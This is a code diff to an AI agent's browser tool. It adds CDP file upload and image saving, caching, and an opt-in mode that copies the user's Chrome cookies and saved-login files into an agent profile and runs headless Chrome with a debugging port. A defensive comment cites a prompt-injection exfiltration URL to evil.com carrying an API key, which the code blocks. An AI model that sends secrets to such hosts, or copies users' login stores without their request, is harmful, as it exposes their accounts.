@@ -50,6 +50,7 @@ Usage:
 """
 
 import atexit
+import functools
 import json
 import logging
 import os
@@ -100,27 +101,27 @@ _SANE_PATH = (
 )
 
 
-def _discover_homebrew_node_dirs() -> list[str]:
+@functools.lru_cache(maxsize=1)
+def _discover_homebrew_node_dirs() -> tuple[str, ...]:
     """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).
 
     When Node is installed via ``brew install node@24`` and NOT linked into
-    /opt/homebrew/bin, the binary lives only in /opt/homebrew/opt/node@24/bin/.
-    This function discovers those paths so they can be added to subprocess PATH.
+    /opt/homebrew/bin, agent-browser isn't discoverable on the default PATH.
+    This function finds those directories so they can be prepended.
     """
     dirs: list[str] = []
     homebrew_opt = "/opt/homebrew/opt"
     if not os.path.isdir(homebrew_opt):
-        return dirs
+        return tuple(dirs)
     try:
         for entry in os.listdir(homebrew_opt):
             if entry.startswith("node") and entry != "node":
-                # e.g. node@20, node@24
                 bin_dir = os.path.join(homebrew_opt, entry, "bin")
                 if os.path.isdir(bin_dir):
                     dirs.append(bin_dir)
     except OSError:
         pass
-    return dirs
+    return tuple(dirs)
 
 # Throttle screenshot cleanup to avoid repeated full directory scans.
 _last_screenshot_cleanup_by_dir: dict[str, float] = {}
@@ -132,28 +133,39 @@ _last_screenshot_cleanup_by_dir: dict[str, float] = {}
 # Default timeout for browser commands (seconds)
 DEFAULT_COMMAND_TIMEOUT = 30
 
-# Default session timeout (seconds)
-DEFAULT_SESSION_TIMEOUT = 300
-
 # Max tokens for snapshot content before summarization
 SNAPSHOT_SUMMARIZE_THRESHOLD = 8000
+
+# Commands that legitimately return empty stdout (e.g. close, record).
+_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})
+
+_cached_command_timeout: Optional[int] = None
+_command_timeout_resolved = False
 
 
 def _get_command_timeout() -> int:
     """Return the configured browser command timeout from config.yaml.
 
     Reads ``config["browser"]["command_timeout"]`` and falls back to
-    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.
+    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
+    cached after the first call and cleared by ``cleanup_all_browsers()``.
     """
+    global _cached_command_timeout, _command_timeout_resolved
+    if _command_timeout_resolved:
+        return _cached_command_timeout  # type: ignore[return-value]
+
+    _command_timeout_resolved = True
+    result = DEFAULT_COMMAND_TIMEOUT
     try:
         from hermes_cli.config import read_raw_config
         cfg = read_raw_config()
         val = cfg.get("browser", {}).get("command_timeout")
         if val is not None:
-            return max(int(val), 5)  # Floor at 5s to avoid instant kills
+            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
     except Exception as e:
         logger.debug("Could not read command_timeout from config: %s", e)
-    return DEFAULT_COMMAND_TIMEOUT
+    _cached_command_timeout = result
+    return result
 
 
 def _get_vision_model() -> Optional[str]:
@@ -215,14 +227,157 @@ def _resolve_cdp_override(cdp_url: str) -> str:
     return raw
 
 
+def _auto_launch_chrome_cdp(port: int = 9222) -> str:
+    """Auto-launch Chrome with the user's real profile and CDP enabled.
+
+    This allows Hermes to use the user's existing logins (Instagram, Twitter,
+    LinkedIn, etc.) instead of starting a fresh browser with no cookies.
+
+    Returns the CDP URL if successful, empty string otherwise.
+    """
+    import platform as _plat
+    import socket
+    import time as _time
+
+    # First check if Chrome is already running with CDP
+    try:
+        with socket.create_connection(("127.0.0.1", port), timeout=1):
+            logger.info("Chrome CDP already available on port %d", port)
+            return f"http://localhost:{port}"
+    except (ConnectionRefusedError, OSError):
+        pass
+
+    # Find Chrome binary
+    sys_name = _plat.system()
+    if sys_name == "Darwin":
+        candidates = [
+            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
+            "/Applications/Chromium.app/Contents/MacOS/Chromium",
+            "/Applications/Google Chrome Canary.app/Contents/MacOS/Google Chrome Canary",
+        ]
+    elif sys_name == "Linux":
+        import shutil
+        candidates = [p for p in [
+            shutil.which("google-chrome"),
+            shutil.which("google-chrome-stable"),
+            shutil.which("chromium-browser"),
+            shutil.which("chromium"),
+        ] if p]
+    else:
+        candidates = []
+
+    chrome_bin = next((c for c in candidates if os.path.isfile(c)), None)
+    if not chrome_bin:
+        logger.debug("No Chrome binary found for auto-launch")
+        return ""
+
+    # Find user's default Chrome profile
+    if sys_name == "Darwin":
+        user_data_dir = os.path.expanduser(
+            "~/Library/Application Support/Google/Chrome"
+        )
+    elif sys_name == "Linux":
+        user_data_dir = os.path.expanduser("~/.config/google-chrome")
+    else:
+        user_data_dir = ""
+
+    try:
+        import subprocess as _sp
+        import shutil
+
+        # Chrome requires a non-default --user-data-dir for CDP.
+        # Create a Hermes profile dir and copy login cookies from the real profile.
+        hermes_profile = os.path.expanduser("~/.hermes/chrome-profile")
+        os.makedirs(hermes_profile, exist_ok=True)
+        if user_data_dir and os.path.isdir(user_data_dir):
+            real_default = os.path.join(user_data_dir, "Default")
+            hermes_default = os.path.join(hermes_profile, "Default")
+            os.makedirs(hermes_default, exist_ok=True)
+            for fname in ("Cookies", "Login Data", "Web Data",
+                          "Preferences", "Secure Preferences"):
+                src = os.path.join(real_default, fname)
+                dst = os.path.join(hermes_default, fname)
+                if os.path.exists(src):
+                    try:
+                        shutil.copy2(src, dst)
+                    except Exception:
+                        pass
+            # Copy Local State from Chrome root
+            ls_src = os.path.join(user_data_dir, "Local State")
+            ls_dst = os.path.join(hermes_profile, "Local State")
+            if os.path.exists(ls_src):
+                try:
+                    shutil.copy2(ls_src, ls_dst)
+                except Exception:
+                    pass
+
+        _sp.Popen(
+            [chrome_bin, f"--remote-debugging-port={port}",
+             f"--user-data-dir={hermes_profile}",
+             "--no-first-run", "--no-default-browser-check",
+             "--headless=new"],
+            stdout=_sp.DEVNULL,
+            stderr=_sp.DEVNULL,
+            start_new_session=True,
+        )
+
+        # Wait for CDP to become available
+        for _ in range(15):
+            _time.sleep(1)
+            try:
+                with socket.create_connection(("127.0.0.1", port), timeout=1):
+                    logger.info("Chrome launched with CDP on port %d (user profile)", port)
+                    return f"http://localhost:{port}"
+            except (ConnectionRefusedError, OSError):
+                continue
+
+        logger.warning("Chrome launched but CDP port %d not reachable after 15s", port)
+        return ""
+    except Exception as e:
+        logger.warning("Failed to auto-launch Chrome: %s", e)
+        return ""
+
+
 def _get_cdp_override() -> str:
     """Return a normalized user-supplied CDP URL override, or empty string.
 
     When ``BROWSER_CDP_URL`` is set (e.g. via ``/browser connect``), we skip
     both Browserbase and the local headless launcher and connect directly to
     the supplied Chrome DevTools Protocol endpoint.
+
+    If ``BROWSER_USE_REAL_CHROME`` is set (or no cloud provider is configured),
+    automatically launches Chrome with the user's real profile and CDP enabled
+    so the agent can use existing logins (Instagram, Twitter, LinkedIn, etc.).
     """
-    return _resolve_cdp_override(os.environ.get("BROWSER_CDP_URL", ""))
+    # Explicit CDP URL takes priority
+    explicit = _resolve_cdp_override(os.environ.get("BROWSER_CDP_URL", ""))
+    if explicit:
+        return explicit
+
+    # Auto-connect to real Chrome if enabled
+    hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+    env_path = hermes_home / ".env"
+    use_real = os.environ.get("BROWSER_USE_REAL_CHROME", "").strip().lower()
+
+    # Also check .env file for the setting
+    if not use_real and env_path.exists():
+        try:
+            with open(env_path) as f:
+                for line in f:
+                    if line.strip().startswith("BROWSER_USE_REAL_CHROME="):
+                        use_real = line.split("=", 1)[1].strip().strip('"').lower()
+                        break
+        except Exception:
+            pass
+
+    if use_real in ("1", "true", "yes"):
+        cdp_url = _auto_launch_chrome_cdp()
+        if cdp_url:
+            # Cache it so we don't re-launch every time
+            os.environ["BROWSER_CDP_URL"] = cdp_url
+            return _resolve_cdp_override(cdp_url)
+
+    return ""
 
 
 # ============================================================================
@@ -239,6 +394,8 @@ _cached_cloud_provider: Optional[CloudBrowserProvider] = None
 _cloud_provider_resolved = False
 _allow_private_urls_resolved = False
 _cached_allow_private_urls: Optional[bool] = None
+_cached_agent_browser: Optional[str] = None
+_agent_browser_resolved = False
 
 
 def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
@@ -283,6 +440,26 @@ def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
                 _cached_cloud_provider = fallback_provider
 
     return _cached_cloud_provider
+
+
+from hermes_constants import is_termux as _is_termux_environment
+
+
+def _browser_install_hint() -> str:
+    if _is_termux_environment():
+        return "npm install -g agent-browser && agent-browser install"
+    return "npm install -g agent-browser && agent-browser install --with-deps"
+
+
+def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
+    return _is_termux_environment() and _is_local_mode() and browser_cmd.strip() == "npx agent-browser"
+
+
+def _termux_browser_install_error() -> str:
+    return (
+        "Local browser automation on Termux cannot rely on the bare npx fallback. "
+        f"Install agent-browser explicitly first: {_browser_install_hint()}"
+    )
 
 
 def _is_local_mode() -> bool:
@@ -395,7 +572,7 @@ def _emergency_cleanup_all_sessions():
         with _cleanup_lock:
             _active_sessions.clear()
             _session_last_activity.clear()
-        _recording_sessions.clear()
+            _recording_sessions.clear()
 
 
 # Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
@@ -598,15 +775,6 @@ BROWSER_TOOL_SCHEMAS = [
         }
     },
     {
-        "name": "browser_close",
-        "description": "Close the browser session and release resources. Call this when done with browser tasks to free up cloud browser session quota.",
-        "parameters": {
-            "type": "object",
-            "properties": {},
-            "required": []
-        }
-    },
-    {
         "name": "browser_get_images",
         "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
         "parameters": {
@@ -648,6 +816,38 @@ BROWSER_TOOL_SCHEMAS = [
                 "expression": {
                     "type": "string",
                     "description": "JavaScript expression to evaluate in the page context. Runs in the browser like DevTools console — full access to DOM, window, document. Return values are serialized to JSON. Example: 'document.title' or 'document.querySelectorAll(\"a\").length'"
+                }
+            },
+            "required": []
+        }
+    },
+    {
+        "name": "browser_upload_file",
+        "description": "Upload a file to the page by setting it on a <input type='file'> element. Bypasses the native OS file picker dialog by using Chrome DevTools Protocol directly. Use this AFTER navigating to an upload page (e.g., Instagram Create Post dialog). Works with Instagram, Twitter, LinkedIn, and any site with a file upload input. The file must exist on disk — use browser_save_image to save images from web pages first.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "file_path": {
+                    "type": "string",
+                    "description": "Absolute path to the file to upload (e.g., /Users/name/.hermes/generated-images/photo.png)"
+                }
+            },
+            "required": ["file_path"]
+        }
+    },
+    {
+        "name": "browser_save_image",
+        "description": "Save an image from the current page to disk. Finds images on the page and downloads them using CDP, bypassing the OS save dialog. Use this to save AI-generated images from Google AI Studio, or any image visible on a web page. Returns the file path of the saved image. Use css_selector to target a specific image, or leave empty to save the largest image on the page.",
+        "parameters": {
+            "type": "object",
+            "properties": {
+                "css_selector": {
+                    "type": "string",
+                    "description": "CSS selector to find the image element (e.g., 'img.generated-image', 'canvas', '[data-testid=\"image\"]'). If empty, saves the largest image on the page."
+                },
+                "filename": {
+                    "type": "string",
+                    "description": "Optional filename for the saved image (e.g., 'instagram_post.png'). If omitted, auto-generated from timestamp."
                 }
             },
             "required": []
@@ -757,10 +957,26 @@ def _find_agent_browser() -> str:
     Raises:
         FileNotFoundError: If agent-browser is not installed
     """
+    global _cached_agent_browser, _agent_browser_resolved
+    if _agent_browser_resolved:
+        if _cached_agent_browser is None:
+            raise FileNotFoundError(
+                "agent-browser CLI not found (cached). Install it with: "
+                f"{_browser_install_hint()}\n"
+                "Or run 'npm install' in the repo root to install locally.\n"
+                "Or ensure npx is available in your PATH."
+            )
+        return _cached_agent_browser
+
+    # Note: _agent_browser_resolved is set at each return site below
+    # (not before the search) to prevent a race where a concurrent thread
+    # sees resolved=True but _cached_agent_browser is still None.
 
     # Check if it's in PATH (global install)
     which_result = shutil.which("agent-browser")
     if which_result:
+        _cached_agent_browser = which_result
+        _agent_browser_resolved = True
         return which_result
 
     # Build an extended search PATH including Homebrew and Hermes-managed dirs.
@@ -780,23 +996,32 @@ def _find_agent_browser() -> str:
         extended_path = os.pathsep.join(extra_dirs)
         which_result = shutil.which("agent-browser", path=extended_path)
         if which_result:
+            _cached_agent_browser = which_result
+            _agent_browser_resolved = True
             return which_result
 
     # Check local node_modules/.bin/ (npm install in repo root)
     repo_root = Path(__file__).parent.parent
     local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
     if local_bin.exists():
-        return str(local_bin)
+        _cached_agent_browser = str(local_bin)
+        _agent_browser_resolved = True
+        return _cached_agent_browser
     
     # Check common npx locations (also search extended dirs)
     npx_path = shutil.which("npx")
     if not npx_path and extra_dirs:
         npx_path = shutil.which("npx", path=os.pathsep.join(extra_dirs))
     if npx_path:
-        return "npx agent-browser"
+        _cached_agent_browser = "npx agent-browser"
+        _agent_browser_resolved = True
+        return _cached_agent_browser
     
+    # Nothing found — cache the failure so subsequent calls don't re-scan.
+    _agent_browser_resolved = True
     raise FileNotFoundError(
-        "agent-browser CLI not found. Install it with: npm install -g agent-browser\n"
+        "agent-browser CLI not found. Install it with: "
+        f"{_browser_install_hint()}\n"
         "Or run 'npm install' in the repo root to install locally.\n"
         "Or ensure npx is available in your PATH."
     )
@@ -852,6 +1077,11 @@ def _run_browser_command(
     except FileNotFoundError as e:
         logger.warning("agent-browser CLI not found: %s", e)
         return {"success": False, "error": str(e)}
+
+    if _requires_real_termux_browser_install(browser_cmd):
+        error = _termux_browser_install_error()
+        logger.warning("browser command blocked on Termux: %s", error)
+        return {"success": False, "error": error}
     
     from tools.interrupt import is_interrupted
     if is_interrupted():
@@ -909,7 +1139,7 @@ def _run_browser_command(
         path_parts = [p for p in existing_path.split(":") if p]
         candidate_dirs = (
             [hermes_node_bin]
-            + _discover_homebrew_node_dirs()
+            + list(_discover_homebrew_node_dirs())
             + [p for p in _SANE_PATH.split(":") if p]
         )
 
@@ -968,14 +1198,14 @@ def _run_browser_command(
             level = logging.WARNING if returncode != 0 else logging.DEBUG
             logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
         
-        # Log empty output as warning — common sign of broken agent-browser
-        if not stdout.strip() and returncode == 0:
-            logger.warning("browser '%s' returned empty stdout with rc=0. "
-                           "cmd=%s stderr=%s",
-                           command, " ".join(cmd_parts[:4]) + "...",
-                           (stderr or "")[:200])
-
         stdout_text = stdout.strip()
+
+        # Empty output with rc=0 is a broken state — treat as failure rather
+        # than silently returning {"success": True, "data": {}}.
+        # Some commands (close, record) legitimately return no output.
+        if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
+            logger.warning("browser '%s' returned empty output (rc=0)", command)
+            return {"success": False, "error": f"Browser command '{command}' returned no output"}
 
         if stdout_text:
             try:
@@ -1088,20 +1318,34 @@ def _extract_relevant_content(
 
 
 def _truncate_snapshot(snapshot_text: str, max_chars: int = 8000) -> str:
-    """
-    Simple truncation fallback for snapshots.
-    
+    """Structure-aware truncation for snapshots.
+
+    Cuts at line boundaries so that accessibility tree elements are never
+    split mid-line, and appends a note telling the agent how much was
+    omitted.
+
     Args:
         snapshot_text: The snapshot text to truncate
         max_chars: Maximum characters to keep
-        
+
     Returns:
         Truncated text with indicator if truncated
     """
     if len(snapshot_text) <= max_chars:
         return snapshot_text
-    
-    return snapshot_text[:max_chars] + "\n\n[... content truncated ...]"
+
+    lines = snapshot_text.split('\n')
+    result: list[str] = []
+    chars = 0
+    for line in lines:
+        if chars + len(line) + 1 > max_chars - 80:  # reserve space for note
+            break
+        result.append(line)
+        chars += len(line) + 1
+    remaining = len(lines) - len(result)
+    if remaining > 0:
+        result.append(f'\n[... {remaining} more lines truncated, use browser_snapshot for full content]')
+    return '\n'.join(result)
 
 
 # ============================================================================
@@ -1122,8 +1366,11 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     # Secret exfiltration protection — block URLs that embed API keys or
     # tokens in query parameters. A prompt injection could trick the agent
     # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    # Also check URL-decoded form to catch %2D encoding tricks (e.g. sk%2Dant%2D...).
+    import urllib.parse
     from agent.redact import _PREFIX_RE
-    if _PREFIX_RE.search(url):
+    url_decoded = urllib.parse.unquote(url)
+    if _PREFIX_RE.search(url) or _PREFIX_RE.search(url_decoded):
         return json.dumps({
             "success": False,
             "error": "Blocked: URL contains what appears to be an API key or token. "
@@ -1389,13 +1636,15 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
             "error": f"Invalid direction '{direction}'. Use 'up' or 'down'."
         }, ensure_ascii=False)
 
-    # Repeat the scroll 5 times to get meaningful page movement.
-    # Most backends scroll ~100px per call, which is barely visible.
-    # 5x gives roughly half a viewport of travel, backend-agnostic.
-    _SCROLL_REPEATS = 5
+    # Single scroll with pixel amount instead of 5x subprocess calls.
+    # agent-browser supports: agent-browser scroll down 500
+    # ~500px is roughly half a viewport of travel.
+    _SCROLL_PIXELS = 500
 
     if _is_camofox_mode():
         from tools.browser_camofox import camofox_scroll
+        # Camofox REST API doesn't support pixel args; use repeated calls
+        _SCROLL_REPEATS = 5
         result = None
         for _ in range(_SCROLL_REPEATS):
             result = camofox_scroll(direction, task_id)
@@ -1403,14 +1652,12 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
 
     effective_task_id = task_id or "default"
 
-    result = None
-    for _ in range(_SCROLL_REPEATS):
-        result = _run_browser_command(effective_task_id, "scroll", [direction])
-        if not result.get("success"):
-            return json.dumps({
-                "success": False,
-                "error": result.get("error", f"Failed to scroll {direction}")
-            }, ensure_ascii=False)
+    result = _run_browser_command(effective_task_id, "scroll", [direction, str(_SCROLL_PIXELS)])
+    if not result.get("success"):
+        return json.dumps({
+            "success": False,
+            "error": result.get("error", f"Failed to scroll {direction}")
+        }, ensure_ascii=False)
 
     return json.dumps({
         "success": True,
@@ -1581,11 +1828,11 @@ def _browser_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
     """Evaluate JS via Camofox's /tabs/{tab_id}/eval endpoint (if available)."""
-    from tools.browser_camofox import _get_session, _ensure_tab, _post
+    from tools.browser_camofox import _ensure_tab, _post
     try:
-        session = _get_session(task_id or "default")
-        tab_id = _ensure_tab(session)
-        resp = _post(f"/tabs/{tab_id}/eval", json_data={"expression": expression})
+        tab_info = _ensure_tab(task_id or "default")
+        tab_id = tab_info.get("tab_id") or tab_info.get("id")
+        resp = _post(f"/tabs/{tab_id}/eval", body={"expression": expression})
 
         # Camofox returns the result in a JSON envelope
         raw_result = resp.get("result") if isinstance(resp, dict) else resp
@@ -1615,8 +1862,9 @@ def _camofox_eval(expression: str, task_id: Optional[str] = None) -> str:
 
 def _maybe_start_recording(task_id: str):
     """Start recording if browser.record_sessions is enabled in config."""
-    if task_id in _recording_sessions:
-        return
+    with _cleanup_lock:
+        if task_id in _recording_sessions:
+            return
     try:
         from hermes_cli.config import read_raw_config
         hermes_home = get_hermes_home()
@@ -1636,7 +1884,8 @@ def _maybe_start_recording(task_id: str):
         
         result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
         if result.get("success"):
-            _recording_sessions.add(task_id)
+            with _cleanup_lock:
+                _recording_sessions.add(task_id)
             logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
         else:
             logger.debug("Could not start auto-recording: %s", result.get("error"))
@@ -1646,8 +1895,9 @@ def _maybe_start_recording(task_id: str):
 
 def _maybe_stop_recording(task_id: str):
     """Stop recording if one is active for this session."""
-    if task_id not in _recording_sessions:
-        return
+    with _cleanup_lock:
+        if task_id not in _recording_sessions:
+            return
     try:
         result = _run_browser_command(task_id, "record", ["stop"])
         if result.get("success"):
@@ -1656,7 +1906,8 @@ def _maybe_stop_recording(task_id: str):
     except Exception as e:
         logger.debug("Could not stop recording for %s: %s", task_id, e)
     finally:
-        _recording_sessions.discard(task_id)
+        with _cleanup_lock:
+            _recording_sessions.discard(task_id)
 
 
 def browser_get_images(task_id: Optional[str] = None) -> str:
@@ -1797,10 +2048,10 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
                 ),
             }, ensure_ascii=False)
         
-        # Read and convert to base64
-        image_data = screenshot_path.read_bytes()
-        image_base64 = base64.b64encode(image_data).decode("ascii")
-        data_url = f"data:image/png;base64,{image_base64}"
+        # Convert screenshot to base64 at full resolution.
+        _screenshot_bytes = screenshot_path.read_bytes()
+        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
+        data_url = f"data:image/png;base64,{_screenshot_b64}"
         
         vision_prompt = (
             f"You are analyzing a screenshot of a web browser.\n\n"
@@ -1814,7 +2065,7 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         # Use the centralized LLM router
         vision_model = _get_vision_model()
         logger.debug("browser_vision: analysing screenshot (%d bytes)",
-                     len(image_data))
+                     len(_screenshot_bytes))
 
         # Read vision timeout from config (auxiliary.vision.timeout), default 120s.
         # Local vision models (llama.cpp, ollama) can take well over 30s for
@@ -1846,7 +2097,27 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
         }
         if vision_model:
             call_kwargs["model"] = vision_model
-        response = call_llm(**call_kwargs)
+        # Try full-size screenshot; on size-related rejection, downscale and retry.
+        try:
+            response = call_llm(**call_kwargs)
+        except Exception as _api_err:
+            from tools.vision_tools import (
+                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
+            )
+            if (_is_image_size_error(_api_err)
+                    and len(data_url) > _RESIZE_TARGET_BYTES):
+                logger.info(
+                    "Vision API rejected screenshot (%.1f MB); "
+                    "auto-resizing to ~%.0f MB and retrying...",
+                    len(data_url) / (1024 * 1024),
+                    _RESIZE_TARGET_BYTES / (1024 * 1024),
+                )
+                data_url = _resize_image_for_vision(
+                    screenshot_path, mime_type="image/png")
+                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
+                response = call_llm(**call_kwargs)
+            else:
+                raise
         
         analysis = (response.choices[0].message.content or "").strip()
         # Redact secrets the vision LLM may have read from the screenshot.
@@ -2007,7 +2278,7 @@ def cleanup_browser(task_id: Optional[str] = None) -> None:
 def cleanup_all_browsers() -> None:
     """
     Clean up all active browser sessions.
-    
+
     Useful for cleanup on shutdown.
     """
     with _cleanup_lock:
@@ -2015,6 +2286,464 @@ def cleanup_all_browsers() -> None:
     for task_id in task_ids:
         cleanup_browser(task_id)
 
+
+# Auto-register with cleanup registry
+try:
+    from agent.cleanup_registry import register_cleanup as _register_cleanup
+    _register_cleanup(cleanup_all_browsers)
+except ImportError:
+    pass
+
+
+def browser_upload_file(file_path: str, task_id: Optional[str] = None) -> str:
+    """Upload a file to a file input element on the page using CDP protocol.
+
+    This bypasses the native OS file picker by communicating directly with
+    Chrome DevTools Protocol.  The function:
+    1. Finds the first ``<input type="file">`` on the page via CDP.
+    2. Sets the file using ``DOM.setFileInputFiles``.
+    3. Dispatches a ``change`` event so the page picks it up.
+
+    Works with Instagram, Twitter, LinkedIn, and any other site that uses
+    a standard file input for uploads.
+
+    Args:
+        file_path: Absolute path to the file on disk.
+        task_id: Task identifier for session isolation.
+
+    Returns:
+        JSON string with upload result.
+    """
+    import urllib.request
+    import urllib.error
+
+    effective_task_id = task_id or "default"
+
+    # Validate file exists
+    if not os.path.isfile(file_path):
+        return json.dumps({
+            "success": False,
+            "error": f"File not found: {file_path}",
+        })
+
+    # Get CDP URL from the session or env
+    cdp_http_url = None
+    with _cleanup_lock:
+        session_info = _active_sessions.get(effective_task_id)
+    if session_info and session_info.get("cdp_url"):
+        raw = session_info["cdp_url"]
+        # Convert ws:// to http:// for REST calls
+        cdp_http_url = raw.replace("ws://", "http://").replace("wss://", "https://")
+        # Strip path (e.g. /devtools/browser/xxx) for the HTTP API
+        from urllib.parse import urlparse
+        parsed = urlparse(cdp_http_url)
+        cdp_http_url = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
+    if not cdp_http_url:
+        # Try env
+        env_url = os.environ.get("BROWSER_CDP_URL", "")
+        if env_url:
+            cdp_http_url = env_url.replace("ws://", "http://").replace("wss://", "https://")
+            from urllib.parse import urlparse
+            parsed = urlparse(cdp_http_url)
+            cdp_http_url = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
+
+    if not cdp_http_url:
+        return json.dumps({
+            "success": False,
+            "error": "No CDP connection available. Browser must be running with CDP enabled.",
+        })
+
+    try:
+        # Step 1: Get the first page/tab's WebSocket debugger URL
+        pages_url = f"{cdp_http_url}/json"
+        req = urllib.request.Request(pages_url)
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            pages = json.loads(resp.read())
+
+        # Find the active page (not devtools or extension)
+        ws_url = None
+        for page in pages:
+            if page.get("type") == "page":
+                ws_url = page.get("webSocketDebuggerUrl")
+                if ws_url:
+                    break
+
+        if not ws_url:
+            return json.dumps({
+                "success": False,
+                "error": "No active browser page found via CDP.",
+            })
+
+        # Step 2: Send CDP commands via WebSocket
+        import websocket  # websocket-client
+
+        ws = websocket.create_connection(ws_url, timeout=10)
+        cmd_id = 1
+
+        def send_cdp(method: str, params: dict = None) -> dict:
+            nonlocal cmd_id
+            msg = {"id": cmd_id, "method": method, "params": params or {}}
+            ws.send(json.dumps(msg))
+            # Read responses until we get the one matching our id
+            while True:
+                resp_raw = ws.recv()
+                resp_data = json.loads(resp_raw)
+                if resp_data.get("id") == cmd_id:
+                    cmd_id += 1
+                    return resp_data
+                # Skip events
+
+        try:
+            # Enable DOM
+            send_cdp("DOM.enable")
+
+            # Get document root
+            doc = send_cdp("DOM.getDocument", {"depth": 0})
+            root_node_id = doc["result"]["root"]["nodeId"]
+
+            # Find file input
+            query = send_cdp("DOM.querySelector", {
+                "nodeId": root_node_id,
+                "selector": 'input[type="file"]',
+            })
+            file_input_id = query["result"].get("nodeId", 0)
+
+            if not file_input_id:
+                # Some sites use hidden file inputs — try broader search
+                query = send_cdp("DOM.querySelectorAll", {
+                    "nodeId": root_node_id,
+                    "selector": "input[type=file]",
+                })
+                node_ids = query["result"].get("nodeIds", [])
+                if node_ids:
+                    file_input_id = node_ids[0]
+
+            if not file_input_id:
+                ws.close()
+                return json.dumps({
+                    "success": False,
+                    "error": "No <input type='file'> found on the page. "
+                             "Navigate to the upload dialog first (click Create/+ button).",
+                })
+
+            # Set the file on the input
+            result = send_cdp("DOM.setFileInputFiles", {
+                "nodeId": file_input_id,
+                "files": [file_path],
+            })
+
+            if "error" in result:
+                ws.close()
+                return json.dumps({
+                    "success": False,
+                    "error": f"CDP setFileInputFiles failed: {result['error']}",
+                })
+
+            # Dispatch change event to trigger the page's handlers
+            # Resolve to a Runtime object first
+            resolve = send_cdp("DOM.resolveNode", {"nodeId": file_input_id})
+            object_id = resolve.get("result", {}).get("object", {}).get("objectId")
+
+            if object_id:
+                send_cdp("Runtime.callFunctionOn", {
+                    "objectId": object_id,
+                    "functionDeclaration": """function() {
+                        this.dispatchEvent(new Event('change', {bubbles: true}));
+                        this.dispatchEvent(new Event('input', {bubbles: true}));
+                    }""",
+                    "returnByValue": True,
+                })
+
+        finally:
+            ws.close()
+
+        logger.info("File uploaded via CDP: %s", file_path)
+        return json.dumps({
+            "success": True,
+            "file": file_path,
+            "message": "File set on input element. The page should now show the upload preview.",
+        })
+
+    except ImportError:
+        # websocket-client not installed — use a subprocess fallback
+        logger.warning("websocket-client not installed, trying pip install")
+        try:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", "websocket-client", "-q"],
+                timeout=30,
+            )
+            # Retry recursively after install
+            return browser_upload_file(file_path, task_id)
+        except Exception as install_err:
+            return json.dumps({
+                "success": False,
+                "error": f"websocket-client not installed and auto-install failed: {install_err}. "
+                         f"Run: pip install websocket-client",
+            })
+    except Exception as e:
+        logger.error("browser_upload_file failed: %s", e, exc_info=True)
+        return json.dumps({
+            "success": False,
+            "error": str(e),
+        })
+
+
+def browser_save_image(
+    css_selector: str = "",
+    filename: str = "",
+    task_id: Optional[str] = None,
+) -> str:
+    """Save an image from the current page to disk using CDP.
+
+    Supports ``<img>`` elements (any src: https, blob, data URI) and
+    ``<canvas>`` elements.  Uses Chrome DevTools Protocol to evaluate
+    JavaScript that fetches the image data as base64, then writes it
+    to ``~/.hermes/generated-images/``.
+
+    Args:
+        css_selector: CSS selector for the target image.  If empty,
+            picks the largest ``<img>`` on the page.
+        filename: Optional output filename.  Auto-generated if omitted.
+        task_id: Task identifier for session isolation.
+
+    Returns:
+        JSON string with ``success``, ``file_path``, and ``size_bytes``.
+    """
+    import base64 as _b64
+    import urllib.request
+    import urllib.error
+    import time as _time
+
+    effective_task_id = task_id or "default"
+
+    # ---------- resolve CDP HTTP base URL ----------
+    cdp_http_url = None
+    with _cleanup_lock:
+        session_info = _active_sessions.get(effective_task_id)
+    if session_info and session_info.get("cdp_url"):
+        raw = session_info["cdp_url"]
+        cdp_http_url = raw.replace("ws://", "http://").replace("wss://", "https://")
+        from urllib.parse import urlparse
+        parsed = urlparse(cdp_http_url)
+        cdp_http_url = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
+    if not cdp_http_url:
+        env_url = os.environ.get("BROWSER_CDP_URL", "")
+        if env_url:
+            cdp_http_url = env_url.replace("ws://", "http://").replace("wss://", "https://")
+            from urllib.parse import urlparse
+            parsed = urlparse(cdp_http_url)
+            cdp_http_url = f"{parsed.scheme}://{parsed.hostname}:{parsed.port}"
+    if not cdp_http_url:
+        return json.dumps({"success": False, "error": "No CDP connection."})
+
+    try:
+        # ---------- get first page WS URL ----------
+        pages_url = f"{cdp_http_url}/json"
+        req = urllib.request.Request(pages_url)
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            pages = json.loads(resp.read())
+        ws_url = None
+        for page in pages:
+            if page.get("type") == "page":
